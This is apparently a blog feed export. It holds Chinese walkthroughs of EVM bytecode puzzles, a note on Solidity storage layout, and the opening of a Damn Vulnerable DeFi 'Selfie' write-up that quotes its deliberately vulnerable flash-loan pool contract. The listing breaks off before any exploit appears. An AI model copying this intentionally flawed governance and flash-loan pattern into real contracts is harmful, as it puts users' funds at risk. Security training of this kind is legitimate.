#</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36      CALLDATASIZE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      5B      JUMPDEST</span><br><span class="line">05      00      STOP</span><br></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><ul><li>操作码：<code>0x36</code></li><li>gas消耗：2</li><li>功能：获取交易或合约调用的<code>data</code>字段的字节长度，并压入堆栈。</li><li>使用场景：在读取数据之前检查大小。</li></ul><p>所以我们传入任意四位长度的data就可以了，<code>CALLDATASIZE = 0x00000000</code></p><h2 id="Puzzles4"><a href="#Puzzles4" class="headerlink" title="Puzzles4"></a>Puzzles4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 4 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      18      XOR</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line">0A      5B      JUMPDEST</span><br><span class="line">0B      00      STOP</span><br></pre></td></tr></table></figure><p><strong>XOR</strong><br><code>XOR</code>指令与<code>AND</code>和<code>OR</code>指令类似，但执行的是异或运算。操作码是<code>0x18</code>，gas 消耗为<code>3</code>。</p><p>也就是我们使得<code>CALLVALUE xor 0x0c = a</code> 也就是<code>CALLVALUE xor 1100 = 1010</code>，<code>CALLVALUE = 0110 = 6</code></p><h2 id="Puzzles5"><a href="#Puzzles5" class="headerlink" title="Puzzles5"></a>Puzzles5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 5 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34          CALLVALUE</span><br><span class="line">01      80          DUP1</span><br><span class="line">02      02          MUL</span><br><span class="line">03      610100      PUSH2 0100</span><br><span class="line">06      14          EQ</span><br><span class="line">07      600C        PUSH1 0C</span><br><span class="line">09      57          JUMPI</span><br><span class="line">0A      FD          REVERT</span><br><span class="line">0B      FD          REVERT</span><br><span class="line">0C      5B          JUMPDEST</span><br><span class="line">0D      00          STOP</span><br><span class="line">0E      FD          REVERT</span><br><span class="line">0F      FD          REVERT</span><br></pre></td></tr></table></figure><p><strong>DUP1</strong><br>在EVM中，<code>DUP</code>是一系列的指令，总共有16个，从<code>DUP1</code>到<code>DUP16</code>，操作码范围为<code>0x80</code>到<code>0x8F</code>，gas消耗均为3。这些指令用于复制（Duplicate）堆栈上的指定元素（根据指令的序号）到堆栈顶部。例如，<code>DUP1</code>复制栈顶元素，<code>DUP2</code>复制距离栈顶的第二个元素，以此类推。</p><p><strong>MUL</strong><br>MUL<code>指令和</code>ADD<code>类似，但是它将堆栈的顶部两个元素相乘。操作码是</code>0x02<code>，gas消耗为</code>5&#96;。</p><p><strong>EQ</strong><br>EQ<code>指令从堆栈中弹出两个元素，如果两个元素相等，那么将</code>1<code>推入堆栈，否则将</code>0<code>推入堆栈。该指令的操作码是</code>0x14<code>，gas消耗为</code>3&#96;。</p><p><strong>JUMPI</strong><br><code>JUMPI</code>指令用于条件跳转，它从堆栈中弹出两个元素，如果第二个元素（条件，<code>condition</code>）不为0，那么将第一个元素（目标，<code>destination</code>）设定为新的<code>pc</code>的值。操作码是<code>0x57</code>，gas消耗为10。</p><p>所以我们要使<code>CALLVALUE * CALLVALUE = 0x100</code> ，所以我们可以得到<code>CALLVALUE = 16</code></p><h2 id="Puzzles6"><a href="#Puzzles6" class="headerlink" title="Puzzles6"></a>Puzzles6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 6 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      6000      PUSH1 00</span><br><span class="line">02      35        CALLDATALOAD</span><br><span class="line">03      56        JUMP</span><br><span class="line">04      FD        REVERT</span><br><span class="line">05      FD        REVERT</span><br><span class="line">06      FD        REVERT</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      FD        REVERT</span><br><span class="line">0A      5B        JUMPDEST</span><br><span class="line">0B      00        STOP</span><br></pre></td></tr></table></figure><p><strong>CALLDATALOAD</strong></p><ul><li>操作码：<code>0x35</code></li><li>gas消耗: 3</li><li>功能：从交易或合约调用的<code>data</code>字段加载数据。它从堆栈中弹出calldata的偏移量（<code>offset</code>），然后从calldata的<code>offset</code>位置读取32字节的数据并压入堆栈。如果<code>calldata</code>剩余不足32字节，则补0。</li><li>使用场景：读取传入的数据。</li></ul><p>因为<code>JUMPDEST</code>在<code>0A</code>，所以传入：<code>0x000000000000000000000000000000000000000000000000000000000000000a</code></p><h2 id="Puzzles7"><a href="#Puzzles7" class="headerlink" title="Puzzles7"></a>Puzzles7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 7 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1  //=CALLDATASIZE</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      3B        EXTCODESIZE</span><br><span class="line">0C      6001      PUSH1 01</span><br><span class="line">0E      14        EQ</span><br><span class="line">0F      6013      PUSH1 13</span><br><span class="line">11      57        JUMPI</span><br><span class="line">12      FD        REVERT</span><br><span class="line">13      5B        JUMPDEST</span><br><span class="line">14      00        STOP</span><br></pre></td></tr></table></figure><p><strong>CALLDATACOPY</strong></p><ul><li>操作码：<code>0x37</code></li><li>gas消耗：3 + 3 * 数据长度 + 内存扩展成本</li><li>功能：将<code>data</code>中的数据复制到内存中。它会从堆栈中弹出3个参数(mem_offset, calldata_offset, length)，分别对应写到内存的偏移量，读取calldata的偏移量和长度。</li><li>使用场景：将输入数据复制到内存。</li></ul><p><strong>CREATE</strong><br>在EVM中，当一个合约想要创建一个新的合约时，会使用<code>CREATE</code>指令。它的简化流程：</p><ol><li>从堆栈中弹出<code>value</code>（向新合约发送的ETH）、<code>mem_offset</code>和<code>length</code>（新合约的<code>initcode</code>在内存中的初始位置和长度）。</li><li>计算新合约的地址，计算方法为: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = keccak256(rlp([sender_address,sender_nonce]))[<span class="number">12</span>:]</span><br></pre></td></tr></table></figure></li><li>更新ETH余额。</li><li>初始化新的EVM上下文<code>evm_create</code>，用于执行<code>initcode</code>。</li><li>在<code>evm_create</code>中执行<code>initcode</code>。</li><li>如果执行成功，则更新创建的账户状态：更新<code>balance</code>，将<code>nonce</code>初始化为<code>0</code>，将<code>code</code>字段设为<code>evm_create</code>的返回数据，将<code>storage</code>字段设置为<code>evm_create</code>的<code>storage</code>。</li><li>如果成功，则将新合约地址推入堆栈；若失败，将<code>0</code>推入堆栈。</li></ol><p>所以根据题目，我们要构造一个<code>runtimecode = 1</code> 的合约，这样才能通过<code>0E</code>的<code>EQ</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">## 把01放进栈，任意长度为1字节的内容即可</span><br><span class="line">PUSH1 01       </span><br><span class="line">PUSH1 00   </span><br><span class="line">## 把ff存入memory，因为return会才能够内存中返回</span><br><span class="line">MSTORE        </span><br><span class="line">## 将01从内存返回作为runtimecode，压入return需要的另外两个参数。</span><br><span class="line">PUSH1 31</span><br><span class="line">PUSH1 1</span><br><span class="line">RETURN </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以构造出<code>CALLDATA = 60016000526001601ff3</code></p><h2 id="Puzzles8"><a href="#Puzzles8" class="headerlink" title="Puzzles8"></a>Puzzles8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 8 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>想要执行<code>JUMPDEST</code> 先要让<code>CALL = 00</code>，也就是CALL调用CREATE的新合约要失败，才能通过EQ。<br>上一题构造了一个<code>0x60016000526001601ff3</code>,但是01时ADD，但是没有参数所以执行会失败，所以会也可以通过这题。</p><h2 id="Puzzles9"><a href="#Puzzles9" class="headerlink" title="Puzzles9"></a>Puzzles9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 9 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6003      PUSH1 03</span><br><span class="line">03      10        LT</span><br><span class="line">04      6009      PUSH1 09</span><br><span class="line">06      57        JUMPI</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      5B        JUMPDEST</span><br><span class="line">0A      34        CALLVALUE</span><br><span class="line">0B      36        CALLDATASIZE</span><br><span class="line">0C      02        MUL</span><br><span class="line">0D      6008      PUSH1 08</span><br><span class="line">0F      14        EQ</span><br><span class="line">10      6014      PUSH1 14</span><br><span class="line">12      57        JUMPI</span><br><span class="line">13      FD        REVERT</span><br><span class="line">14      5B        JUMPDEST</span><br><span class="line">15      00        STOP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入的<code>CALLDATASIZE</code>需要<code>&gt;3</code>，同时，<code>CALLDATASIZE*CALLVALUE = 8</code> 。<br>所以我们传入<code>CALLDATASIZE = 0x00000000</code>，<code>CALLVALUE = 2</code>即可</p><h2 id="Puzzles10"><a href="#Puzzles10" class="headerlink" title="Puzzles10"></a>Puzzles10</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#############</span><br><span class="line"># Puzzle 10 #</span><br><span class="line">#############</span><br><span class="line"></span><br><span class="line">00      38          CODESIZE</span><br><span class="line">01      34          CALLVALUE</span><br><span class="line">02      90          SWAP1</span><br><span class="line">03      11          GT</span><br><span class="line">04      6008        PUSH1 08</span><br><span class="line">06      57          JUMPI</span><br><span class="line">07      FD          REVERT</span><br><span class="line">08      5B          JUMPDEST</span><br><span class="line">09      36          CALLDATASIZE</span><br><span class="line">0A      610003      PUSH2 0003</span><br><span class="line">0D      90          SWAP1</span><br><span class="line">0E      06          MOD</span><br><span class="line">0F      15          ISZERO</span><br><span class="line">10      34          CALLVALUE</span><br><span class="line">11      600A        PUSH1 0A</span><br><span class="line">13      01          ADD</span><br><span class="line">14      57          JUMPI</span><br><span class="line">15      FD          REVERT</span><br><span class="line">16      FD          REVERT</span><br><span class="line">17      FD          REVERT</span><br><span class="line">18      FD          REVERT</span><br><span class="line">19      5B          JUMPDEST</span><br><span class="line">1A      00          STOP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先<code>CALLVALUE</code>最大不能超过<code>CODESIZE</code>也就是<code>27</code>，其次<code>CALLDATASIZE mod 3 = 0 </code>，最后要求<code>CALLVALUE+0A = 0x19</code>.<br>所以我们可以取<code>CALLDATASIZE = 0x000000</code>,<code>CALLVALUE = 15</code></p>]]></content>
      
      
      <categories>
          
          <category> Opcodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
            <tag> evm-puzzles </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About_Uniswap</title>
      <link href="/2024/01/05/About-Uniswap/"/>
      <url>/2024/01/05/About-Uniswap/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>About_Storage_layout</title>
      <link href="/2024/01/02/About-Storage-layout/"/>
      <url>/2024/01/02/About-Storage-layout/</url>
      
        <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><hr><blockquote><p>Variables are declared as either storage, memory or calldata to explicity specify the location of the data     –solidity-by-example</p></blockquote><ul><li><code>storage</code> - variable is a state variable (store on blockchain))</li><li><code>memory</code> - variable is in memory and it exists while a function is being called</li><li><code>calldata</code> - special data location that contains function arguments</li></ul><h2 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h2><hr><p>State variables of contracts are stored in storage in a compact way. Sometimes multiple values may use the same storage slot. Except for dynamically-sized arrays and mappings , data is stored contiguously item after item starting with the first state variable ,start from slot 0.</p><p>According to the following rules:</p><ul><li>The first item in a storage slot is stored lower-order aligned.</li><li>Value types use only as many bytes as are necessary to store them.</li><li>If a value type does not fit the remaining part of a storage slot, it is stored in the next storage slot.</li><li>Structs and array data always start a new slot and their items are packed tightly according to these rules.</li><li>Items following struct or array data always start a new storage slot.</li></ul><h2 id="Mapping-and-Dynamic-Arrays"><a href="#Mapping-and-Dynamic-Arrays" class="headerlink" title="Mapping and Dynamic Arrays"></a>Mapping and Dynamic Arrays</h2><hr><p>Due to their unpredictable size, mappings and dynamically-sized array types cannot be stored “in between” the state variables preceding and following them. Instead, they are considered to occupy only 32 bytes with regards to the rules above and the elements they contain are stored starting at a different storage slot that is computed using a Keccak-256 hash.</p><h3 id="Dynamic-Variables"><a href="#Dynamic-Variables" class="headerlink" title="Dynamic Variables"></a>Dynamic Variables</h3><p>The object itself does take up a storage slot, but it doesn’t contain the whole array. Instead, the storage slot contains the length of the array.</p><p>If we add a new element to the array by calling <code>Array.push(123)</code>, the array’s length and the new element are stored at separate locations determined by the hash function</p><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><p>For mapping it’s has a slot , but it is empty it’s blank</p><h2 id="Temporary-Variables-Function-Scope"><a href="#Temporary-Variables-Function-Scope" class="headerlink" title="Temporary Variables: Function Scope"></a>Temporary Variables: Function Scope</h2><hr><p>For variables that are declared inside a function, their existence is ephemeral and scoped merely to the span of that function. These variables do not persist inside the contract and are not stored in <code>Storage</code>. Instead, they’re stashed in a different memory data structure, which deletes them as soon as the function has finished execution.<br>e.g:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Contract&#123;</span><br><span class="line">    function test(uint val) public &#123;</span><br><span class="line">        uint nVar = val + 5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>nVar</code> only exists for the duration of <code>test()</code>.</p><h2 id="Memory-Keyword-Necessary-for-Strings"><a href="#Memory-Keyword-Necessary-for-Strings" class="headerlink" title="Memory Keyword: Necessary for Strings"></a>Memory Keyword: Necessary for Strings</h2><p>Finally, the <code>memory</code> keyword. Primarily used with strings, <code>memory</code> is needed because strings are dynamically sized arrays. By using this keyword, we tell Solidity that string operations are to be performed not in <code>Storage</code>, but in a separate memory location.</p><p>Solidity needs this explicit instruction because arrays and mappings require more space, hence the need to ensure that space is allocated in the appropriate data structure.<br>Here’s a code snippet using <code>memory</code> keyword with string:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract exampleContract&#123;</span><br><span class="line">    function getString() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;this is a string!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Constant-immutable"><a href="#Constant-immutable" class="headerlink" title="Constant &amp; immutable"></a>Constant &amp; immutable</h2><hr><p>The Solidity dont store constant or immutable variables in storage instead the vaues will replaced in every occurrence of these variables with their assigned value in the contract’s bytecode.</p><h2 id="Each-Variables-size-Example"><a href="#Each-Variables-size-Example" class="headerlink" title="Each Variables size(Example):"></a>Each Variables size(Example):</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Contract MyContract &#123;</span><br><span class="line">  uint256 zero;                          // in slot 0</span><br><span class="line">  mapping(address =&gt; uint256) one;    // in slot 1</span><br><span class="line">  address two;                          // in slot 2 </span><br><span class="line">  bool a;                              // in slot 3 - 1 byte</span><br><span class="line">  uint8 b;                             // in slot 3 - 1 byte </span><br><span class="line">  bytes16 c;                           // in slot 3 - 16 bytes</span><br><span class="line">  address immutable noWhere;           // Do not stored on storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Use-Foundry"><a href="#Use-Foundry" class="headerlink" title="Use Foundry"></a>Use Foundry</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge inspect contract_name storage</span><br></pre></td></tr></table></figure><p><img src="/../images/storageimg.png"></p><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html">https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Solidity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Solidity </tag>
            
            <tag> Basic </tag>
            
            <tag> Storage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-10</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-10/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-10/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-9</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-9/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-9/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-8</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-8/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-8/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-7</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-7/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-7/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-6</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-6/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-6/</url>
      
        <content type="html"><![CDATA[<h1 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.</span><br><span class="line"></span><br><span class="line">What could go wrong, right ?</span><br><span class="line"></span><br><span class="line">You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><hr><p><code>SelfiePool.sol</code>:</p><details><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;./SimpleGovernance.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SelfiePool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SelfiePool is ReentrancyGuard, IERC3156FlashLender &#123;</span><br><span class="line">    ERC20Snapshot public immutable token;</span><br><span class="line">    SimpleGovernance public immutable governance;</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    error CallerNotGovernance();</span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line">    error CallbackFailed();</span><br><span class="line"></span><br><span class="line">    event FundsDrained(address indexed receiver, uint256 amount);</span><br><span class="line"></span><br><span class="line">    modifier onlyGovernance() &#123;</span><br><span class="line">        if (msg.sender != address(governance)) revert CallerNotGovernance();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _token, address _governance) &#123;</span><br><span class="line">        token = ERC20Snapshot(_token);</span><br><span class="line">        governance = SimpleGovernance(_governance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function maxFlashLoan(address _token) external view returns (uint256) &#123;</span><br><span class="line">        if (address(token) == _token) return token.balanceOf(address(this));</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashFee(address _token, uint256) external view returns (uint256) &#123;</span><br><span class="line">        if (address(token) != _token) revert UnsupportedCurrency();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        if (_token != address(token)) revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        token.transfer(address(_receiver), _amount);</span><br><span class="line">        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) revert CallbackFailed();</span><br><span class="line"></span><br><span class="line">        if (!token.transferFrom(address(_receiver), address(this), _amount)) &#123;</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyExit(address receiver) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.balanceOf(address(this));</span><br><span class="line">        token.transfer(receiver, amount);</span><br><span class="line"></span><br><span class="line">        emit FundsDrained(receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><p><code>ISimpleGovernance.sol</code>:</p><details><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 